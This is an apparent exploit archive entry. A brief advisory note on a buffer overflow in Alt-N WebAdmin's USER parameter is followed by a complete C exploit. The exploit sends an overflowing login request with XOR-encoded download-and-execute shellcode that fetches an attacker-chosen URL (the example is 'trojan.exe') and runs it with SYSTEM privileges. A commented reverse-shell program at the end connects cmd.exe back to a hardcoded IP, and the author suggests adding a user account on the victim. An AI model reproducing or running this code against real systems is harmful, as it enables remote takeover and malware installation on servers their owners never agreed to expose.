source: http://www.securityfocus.com/bid/8024/info
 
Alt-N WebAdmin is prone to a buffer overflow condition. This is due to insufficient bounds checking on the USER parameter. Successful exploitation could result in code execution with SYSTEM level privileges.

/* WebAdmin.dll remote download exec shellcode. Works on 2.0.3 and 2.0.4 all windows sp's.
Oh and my previous exploit, i'm an idiot and 2.0.5 *is* the patch, heh. 
This shellcode was used by ThreaT in his vulnreg.reg exploit, it works quite nicely.
Look at the bottom of the code for some trojan.exe idea's. That one i found somewhere but
i can't remember.
shellcode has one minor suck point, it shows a window on the target host, oh and the exploit
crashes the server, so make a user account and restart the service. Be Kind.
word to Mark Litchfield for finding this, i suggest anyone who is interested in learning win32
exploitation download this and attempt to exploit it, it's easier than you think.
don't download directly from alt-n, they patched all of their 'archived' versions. heh.
shouts to innercircle you little kittens you....
-wire 
*/

#include <winsock2.h>
#include <stdio.h>
#define snprintf _snprintf // <-- a big fuck you to ms.

#pragma comment(lib,"ws2_32") 

char sc[700] = 
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x68\x5E\x56\xC3\x90\x8B\xCC\xFF\xD1\x83\xC6\x0E\x90\x8B\xFE\xAC" 
    "\x34\x99\xAA\x84\xC0\x75\xF8"// download and exec ala ThreaT vulnreg exploit.
    "\x72\xeb\xf3\xa9\xc2\xfd\x12\x9a\x12\xd9\x95\x12\xd1\x95\x12\x58\x12\xc5\xbd\x91"
    "\x12\xe9\xa9\x9a\xed\xbd\x9d\xa1\x87\xec\xd5\x12\xd9\x81\x12\xc1\xa5\x9a\x41\x12"
    "\xc2\xe1\x9a\x41\x12\xea\x85\x9a\x69\xcf\x12\xea\xbd\x9a\x69\xcf\x12\xca\xb9\x9a"
    "\x49\x12\xc2\x81\xd2\x12\xad\x03\x9a\x69\x9a\xed\xbd\x8d\x12\xaf\xa2\xed\xbd\x81"
    "\xed\x93\xd2\xba\x42\xec\x73\xc1\xc1\xaa\x59\x5a\xc6\xaa\x50\xff\x12\x95\xc6\xc6"
    "\x12\xa5\x16\x14\x9d\x9e\x5a\x12\x81\x12\x5a\xa2\x58\xec\x04\x5a\x72\xe5\xaa\x42"
    "\xf1\xe0\xdc\xe1\xd8\xf3\x93\xf3\xd2\xca\x71\xe2\x66\x66\x66\xaa\x50\xc8\xf1\xec"
    "\xeb\xf5\xf4\xff\x5e\xdd\xbd\x9d\xf6\xf7\x12\x75\xc8\xc8\xcc\x66\x49\xf1\xf0\xf5"
    "\xfc\xd8\xf3\x97\xf3\xeb\xf3\x9b\x71\xcc\x66\x66\x66\xaa\x42\xca\xf1\xf8\xb7\xfc"
    "\xe1\x5f\xdd\xbd\x9d\xfc\x12\x55\xca\xca\xc8\x66\xec\x81\xca\x66\x49\xaa\x42\xf1"
    "\xf0\xf7\xdc\xe1\xf3\x98\xf3\xd2\xca\x71\xb5\x66\x66\x66\x14\xd5\xbd\x89\xf3\x98"
    "\xc8\x66\x49\xaa\x42\xf1\xe1\xf0\xed\xc9\xf3\x98\xf3\xd2\xca\x71\x8b\x66\x66\x66"
    "\x66\x49\x71\xe6\x66\x66\x66";


struct sockaddr_in victim;
int main(int argc, char **argv) {
    SOCKET s;
    WSADATA wsadata;
    int x;
    unsigned int i;
    DWORD jmpesp4 = 0x1005d58d; // jmp esp from 2.0.4 webAdmin.dll...
    DWORD jmpesp3 = 0x10071c43; // jmp esp from 2.0.3 webAdmin.dll...

    char exp_buf[5000];
    char post[] = 
        "POST /WebAdmin.dll?View=Logon HTTP/1.1\r\n"
        "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n"
        "Accept-Language: en-us\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Accept-Encoding: gzip, deflate\r\n"
        "User-Agent: Your Mom\r\n"
        "Host: sh0dan.org\r\n";
    
    char rest[] =    
        "Connection: Keep-Alive\r\n"
        "Cache-Control: no-cache\r\n"
        "Cookie: User=test; Lang=en; Theme=Standard\r\n\r\nUser=";

    char o_args[] = 
        "&Password=foo&languageselect=en&Theme=Heavy&Logon=Sign+In\r\n\r\n";
    
    if (argc != 5) {
        fprintf(stderr, "WebAdmin from Alt-N remote LocalSystem exploit.\n");
        fprintf(stderr, "Werd to Mark Litchfield for finding this easily exploited hole\n");
        fprintf(stderr, "supports version 2.0.3 and 2.0.4 on any sp.\n");
        fprintf(stderr, "Usage: %s <victim> <port> <url> <version> where version is 3 or 4\n", argv[0]);
        fprintf(stderr, "Ex: %s 192.168.0.1 1000 http://heh.com/trojan.exe 4\n", argv[0]); 
        exit(1);
    }


    WSAStartup(MAKEWORD(2,0),&wsadata);
    victim.sin_port = htons(atoi(argv[2]));
    victim.sin_addr.s_addr = inet_addr(argv[1]);
    victim.sin_family = AF_INET;


    memset(exp_buf, 0x00, 5000);
    
    for (i = 0; i < strlen(argv[3]); argv[3][i++] ^=0x99);    // xor our url.

    strncat(sc, argv[3], 100); // strcat the xor'd address onto sc.
    strncat(sc, "\x99", 1); // xor'd 00
    snprintf(exp_buf, 2000, "%sContent-Length: %d\r\n%s", post, (strlen(sc)+strlen(rest)+168), rest);

    x = strlen(exp_buf);
    memset(exp_buf+x, 0x90, 168);
    x += 168;

    if(atoi(argv[4]) == 4) {
        memcpy(exp_buf+x, &jmpesp4, 4);
        x += 4;
    } else if (atoi(argv[4]) == 3) {
        memcpy(exp_buf+x, &jmpesp3, 4);
        x += 4;
    } else {
        fprintf(stderr, "uhm unknown version, try 3 or 4\n");
        exit(1);
    }

    memcpy(exp_buf+x, sc, strlen(sc));
    x += strlen(sc);
    
    memcpy(exp_buf+x, o_args, strlen(o_args));
    x += strlen(o_args);
    exp_buf[x+1] = 0x00;

    s = WSASocket(AF_INET,SOCK_STREAM,NULL,NULL,NULL,NULL);
    if(connect(s, (struct sockaddr *)&victim, sizeof(victim)) < 0) {
        fprintf(stderr,"error couldn't connect\n");
	exit(1);
    }
    send(s, exp_buf, x, 0);
    printf("sent!\n");
    return(0);
}


/*
ripped from somewhere, sorry i forget where i got this.
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")

#define PORT 53
#define IP 192.168.0.21
void main(int argc, char *argv[])
{
        WSADATA wsaData;        
        SOCKET hSocket;
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        struct sockaddr_in adik_sin;    
        memset(&adik_sin,0,sizeof(adik_sin));
        memset(&si,0,sizeof(si));
        WSAStartup(MAKEWORD(2,0),&wsaData);
        hSocket = WSASocket(AF_INET,SOCK_STREAM,NULL,NULL,NULL,NULL);
        adik_sin.sin_family = AF_INET;
        adik_sin.sin_port = htons(PORT);
        adik_sin.sin_addr.s_addr = inet_addr("IP");
        connect(hSocket,(struct sockaddr*)&adik_sin,sizeof(adik_sin));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (void *)hSocket;
        CreateProcess(NULL,"cmd",NULL,NULL,true,NULL,NULL,NULL,&si,&pi);        
        ExitProcess(0);

}
*/
